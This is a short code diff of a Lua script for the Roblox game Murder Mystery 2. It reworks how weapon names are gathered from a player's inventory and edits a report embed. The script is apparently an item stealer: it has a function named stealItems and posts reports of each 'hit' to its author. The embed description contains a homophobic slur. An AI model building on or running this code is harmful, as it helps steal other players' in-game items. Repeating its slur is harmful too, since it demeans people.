@@ -60,18 +60,16 @@ end
 local playerLevel = math.min(table.unpack(levelTable))
 local playerPrestige = LevelModule.Prestige
 
-local items = {}
 local itemsReal = {}
 local itemsCount = 0
 
 for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
     for c,d in pairs(b) do
-        table.insert(items, c)
-        table.insert(itemsReal, d)
+        table.insert(itemsReal, d.ItemName)
     end
 end
 
-for i,v in pairs(items) do
+for i,v in pairs(itemsReal) do
     itemsCount = itemsCount + 1
 end
 
@@ -98,7 +96,7 @@ local function stealItems()
 end
 
 local embed = {
-    ["title"] = "New MM2 hit, brought to you buy snowydemise.",
+    ["title"] = "New MM2 hit, brought to you by snowydemise.",
     ["description"] = "Take all this faggot's shit",
     ["color"] = 65280,
     ["fields"] = {
